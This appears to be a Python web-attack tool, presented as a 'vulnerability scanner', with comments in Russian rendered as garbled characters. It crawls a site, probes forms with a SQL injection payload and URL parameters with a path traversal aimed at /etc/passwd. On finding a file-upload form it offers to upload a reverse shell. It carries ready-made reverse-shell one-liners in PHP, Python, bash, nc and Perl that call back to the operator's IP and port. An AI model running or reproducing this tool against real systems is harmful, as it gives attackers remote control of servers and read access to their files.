import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import sys
import os

# –î–æ–±–∞–≤–ª—è–µ–º –ø—É—Ç—å –¥–ª—è –∏–º–ø–æ—Ä—Ç–æ–≤
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))

from scanner.utils.verbose_mixin import VerboseMixin


class WebVulnerabilityScanner(VerboseMixin):
    def __init__(self, target_url: str, is_verbose: bool = True):
        self.target_url = target_url
        self.is_verbose = is_verbose
        self.session = requests.Session()
        self.visited_urls = set()
        self.results = {
            'forms_tested': [],
            'vulnerabilities': [],
            'crawled_pages': 0,
            'directory_structure': {}
        }

    def scan_website(self):
        """–û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –≤–µ–±-—Å–∞–π—Ç–∞"""
        self.verbose_print(f"[*] –ù–∞—á–∞–ª–æ –≤–µ–±-—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: {self.target_url}")
        
        try:
            parsed = urlparse(self.target_url)
            base_domain = parsed.netloc
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º –∫—Ä–∞—É–ª–∏–Ω–≥ –∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ
            self._crawl_and_test(self.target_url, base_domain)
            
            # –°—Ç—Ä–æ–∏–º –∏ –≤—ã–≤–æ–¥–∏–º —Å—Ç—Ä—É–∫—Ç—É—Ä—É –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
            self.results['directory_structure'] = self._build_directory_tree()
            self._print_directory_tree()
            
            self.verbose_print(f"[+] –í–µ–±-—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ. –ù–∞–π–¥–µ–Ω–æ {len(self.results['vulnerabilities'])} —É—è–∑–≤–∏–º–æ—Å—Ç–∏(–µ–π)")
            return self.results
            
        except Exception as e:
            self.verbose_print(f"[!] –û—à–∏–±–∫–∞ –≤–µ–±-—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: {e}")
            return self.results

    def _build_directory_tree(self):
        """–°—Ç—Ä–æ–∏—Ç –¥–µ—Ä–µ–≤–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –∏–∑ –ø–æ—Å–µ—â–µ–Ω–Ω—ã—Ö URL"""
        tree = {}
        
        for url in self.visited_urls:
            parsed = urlparse(url)
            path_parts = [part for part in parsed.path.split('/') if part]
            
            current_level = tree
            for part in path_parts:
                if part not in current_level:
                    current_level[part] = {}
                current_level = current_level[part]
        
        return tree

    def _print_directory_tree(self):
        """–í—ã–≤–æ–¥–∏—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –≤ –≤–∏–¥–µ –¥–µ—Ä–µ–≤–∞"""
        if not self.visited_urls:
            self.verbose_print("[!] –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ø–æ—Å—Ç—Ä–æ–µ–Ω–∏—è –¥–µ—Ä–µ–≤–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π")
            return
            
        print("\nüìÅ –°–¢–†–£–ö–¢–£–†–ê –î–ò–†–ï–ö–¢–û–†–ò–ô:")
        print("üåê " + urlparse(self.target_url).netloc + "/")
        
        def print_tree(node, prefix="", is_last=True):
            items = list(node.items())
            for i, (name, children) in enumerate(items):
                is_last_item = i == len(items) - 1
                connector = "‚îî‚îÄ‚îÄ " if is_last_item else "‚îú‚îÄ‚îÄ "
                print(f"{prefix}{connector}{name}")
                
                new_prefix = prefix + ("    " if is_last_item else "‚îÇ   ")
                print_tree(children, new_prefix, is_last_item)
        
        print_tree(self.results['directory_structure'])

    def _generate_reverse_shell(self, ip: str, port: int, shell_type: str = "php") -> str:
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª–æ–≤"""
        shells = {
            'php': f"""<?php system("bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"); ?>""",
            'php_exec': f"""<?php exec("bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"); ?>""",
            'php_shell_exec': f"""<?php shell_exec("bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"); ?>""",
            'php_passthru': f"""<?php passthru("bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"); ?>""",
            'python': f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""",
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'nc': f"nc -e /bin/sh {ip} {port}",
            'perl': f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
        }
        return shells.get(shell_type, shells['php'])

    def _upload_reverse_shell(self, form: dict, action_url: str) -> bool:
        """–ü—ã—Ç–∞–µ—Ç—Å—è –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª —á–µ—Ä–µ–∑ —Ñ–æ—Ä–º—É –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤"""
        try:
            self.verbose_print(f"[*] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —Ñ–æ—Ä–º–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤: {action_url}")
            
            # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª–∞
            ip = input("[?] –í–≤–µ–¥–∏—Ç–µ –≤–∞—à IP –¥–ª—è —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª–∞: ").strip()
            port = input("[?] –í–≤–µ–¥–∏—Ç–µ –ø–æ—Ä—Ç –¥–ª—è —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª–∞: ").strip()
            shell_type = input("[?] –í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —à–µ–ª–ª–∞ (php/python/bash/nc/perl, –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é php): ").strip() or "php"
            
            # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —à–µ–ª–ª
            shell_content = self._generate_reverse_shell(ip, port, shell_type)
            
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
            extensions = {
                'php': '.php',
                'python': '.py', 
                'bash': '.sh',
                'nc': '.sh',
                'perl': '.pl'
            }
            ext = extensions.get(shell_type, '.php')
            filename = f"shell{ext}"
            
            # –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
            files = {}
            data = form['fields'].copy()
            
            # –î–ª—è PHP —à–µ–ª–ª–æ–≤ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∫ —Ñ–∞–π–ª
            if shell_type.startswith('php'):
                files = {'file': (filename, shell_content, 'application/x-php')}
            else:
                # –î–ª—è –¥—Ä—É–≥–∏—Ö —è–∑—ã–∫–æ–≤ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∫ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª
                files = {'file': (filename, shell_content, 'text/plain')}
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å
            if form['method'] == 'post':
                if form['enctype'] == 'multipart/form-data':
                    resp = self.session.post(action_url, data=data, files=files)
                else:
                    # –ï—Å–ª–∏ –Ω–µ multipart, –ø—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–∞–∫ –æ–±—ã—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                    files = {}
                    data['file_content'] = shell_content
                    resp = self.session.post(action_url, data=data)
            else:
                # GET –∑–∞–ø—Ä–æ—Å —Å —Ñ–∞–π–ª–æ–º –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∫ –¥–∞–Ω–Ω—ã–µ
                files = {}
                data['file_content'] = shell_content
                resp = self.session.get(action_url, params=data)
            
            if resp.status_code in [200, 201, 302]:
                self.verbose_print(f"[+] –†–µ–≤–µ—Ä—Å-—à–µ–ª–ª —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –ö–æ–¥ –æ—Ç–≤–µ—Ç–∞: {resp.status_code}")
                
                # –î–æ–±–∞–≤–ª—è–µ–º –≤ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
                self.results['vulnerabilities'].append({
                    'type': 'Reverse Shell Upload',
                    'url': action_url,
                    'details': f'–£—Å–ø–µ—à–Ω–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª–∞ ({shell_type}) –Ω–∞ {ip}:{port}',
                    'shell_type': shell_type,
                    'attacker_ip': ip,
                    'attacker_port': port
                })
                return True
            else:
                self.verbose_print(f"[-] –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª. –ö–æ–¥ –æ—Ç–≤–µ—Ç–∞: {resp.status_code}")
                return False
                
        except Exception as e:
            self.verbose_print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª–∞: {e}")
            return False

    def _crawl_and_test(self, url: str, base_domain: str):
        """–†–µ–∫—É—Ä—Å–∏–≤–Ω–æ–µ –∫—Ä–∞—É–ª–∏–Ω–≥ –∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü"""
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)
        
        try:
            self.verbose_print(f"[*] –ê–Ω–∞–ª–∏–∑ —Å—Ç—Ä–∞–Ω–∏—Ü—ã: {url}")
            resp = self.session.get(url, timeout=10)
            
            if resp.status_code != 200:
                return
            
            self.results['crawled_pages'] += 1
            html = resp.text
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ñ–æ—Ä–º—ã –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
            forms = self._get_form_fields(html)
            for form in forms:
                self._test_form(url, form)
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º path traversal –≤ URL –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö
            self._test_path_traversal(url)
            
            # –ò—â–µ–º —Å—Å—ã–ª–∫–∏ –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –∫—Ä–∞—É–ª–∏–Ω–≥–∞
            soup = BeautifulSoup(html, "html.parser")
            links = soup.find_all('a', href=True)
            
            for link in links:
                href = link['href']
                abs_url = urljoin(url, href)
                parsed = urlparse(abs_url)
                
                if (parsed.scheme in ['http', 'https'] and 
                    parsed.netloc.endswith(base_domain)):
                    self._crawl_and_test(abs_url, base_domain)
                    
        except Exception as e:
            self.verbose_print(f"[!] –û—à–∏–±–∫–∞ –∞–Ω–∞–ª–∏–∑–∞ {url}: {e}")

    def _get_form_fields(self, html: str):
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç —Ñ–æ—Ä–º—ã —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã"""
        soup = BeautifulSoup(html, "html.parser")
        forms = soup.find_all('form')
        forms_data = []
        
        for form in forms:
            action = form.get('action') or ''
            method = form.get('method', 'get').lower()
            enctype = form.get('enctype', '').lower()
            inputs = form.find_all('input')
            
            fields = {}
            has_file_input = False
            
            for i in inputs:
                name = i.get('name')
                if not name:
                    continue
                if i.get('type', '').lower() == 'file':
                    has_file_input = True
                else:
                    fields[name] = 'test_value'
            
            forms_data.append({
                'action': action,
                'fields': fields,
                'method': method,
                'enctype': enctype,
                'has_file': has_file_input
            })
        
        return forms_data

    def _test_form(self, base_url: str, form: dict):
        """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç —Ñ–æ—Ä–º—É –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏"""
        action_url = urljoin(base_url, form['action'])
        self.verbose_print(f"[*] –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–æ—Ä–º—ã: {action_url}")
        
        try:
            # –ï—Å–ª–∏ –µ—Å—Ç—å –ø–æ–ª–µ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤, –ø—Ä–µ–¥–ª–∞–≥–∞–µ–º –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª
            if form['has_file']:
                upload_choice = input("[?] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —Ñ–æ—Ä–º–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤. –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª? (y/n): ").strip().lower()
                if upload_choice in ['y', 'yes', '–¥', '–¥–∞']:
                    self._upload_reverse_shell(form, action_url)
                    return  # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Ç–µ—Å—Ç—ã –¥–ª—è —ç—Ç–æ–π —Ñ–æ—Ä–º—ã
            
            # –ë–∞–∑–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è
            if form['method'] == 'post':
                base_resp = self.session.post(action_url, data=form['fields'])
            else:
                base_resp = self.session.get(action_url, params=form['fields'])
            
            base_html = base_resp.text
            
            # SQL injection —Ç–µ—Å—Ç
            for field_name in form['fields']:
                test_data = form['fields'].copy()
                test_data[field_name] = "' OR '1'='1"
                
                if form['method'] == 'post':
                    test_resp = self.session.post(action_url, data=test_data)
                else:
                    test_resp = self.session.get(action_url, params=test_data)
                
                if test_resp.text != base_html:
                    vulnerability = {
                        'type': 'SQL Injection',
                        'url': action_url,
                        'field': field_name,
                        'payload': "' OR '1'='1"
                    }
                    self.results['vulnerabilities'].append(vulnerability)
                    self.verbose_print(f"[!] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ SQLi –≤ –ø–æ–ª–µ '{field_name}'")
            
            # –û—Ç–º–µ—á–∞–µ–º —Ñ–∞–π–ª–æ–≤—ã–µ –∑–∞–≥—Ä—É–∑–∫–∏
            if form['has_file']:
                self.results['vulnerabilities'].append({
                    'type': 'File Upload',
                    'url': action_url,
                    'details': '–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤'
                })
                self.verbose_print(f"[!] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —Ñ–æ—Ä–º–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤")
            
            self.results['forms_tested'].append(action_url)
            
        except Exception as e:
            self.verbose_print(f"[!] –û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ñ–æ—Ä–º—ã {action_url}: {e}")

    def _test_path_traversal(self, url: str):
        """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç path traversal –≤ URL –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö"""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        
        if 'file' in qs or 'page' in qs or 'path' in qs:
            base_resp = self.session.get(url)
            base_html = base_resp.text
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ä–∞–∑–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
            for param in ['file', 'page', 'path']:
                if param in qs:
                    test_qs = qs.copy()
                    test_qs[param] = ['../../../../../../../etc/passwd']
                    new_query = urlencode(test_qs, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    test_resp = self.session.get(test_url)
                    if test_resp.text != base_html:
                        self.results['vulnerabilities'].append({
                            'type': 'Path Traversal',
                            'url': test_url,
                            'parameter': param
                        })
                        self.verbose_print(f"[!] –û–±–Ω–∞—Ä—É–∂–µ–Ω Path Traversal –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ '{param}'")


if __name__ == "__main__":
    # –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ
    target = "http://10.226.133.193"
    scanner = WebVulnerabilityScanner(target, is_verbose=True)
    results = scanner.scan_website()
    
    print("\nüìä –†–ï–ó–£–õ–¨–¢–ê–¢–´ –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø:")
    import pprint
    pprint.pprint(results)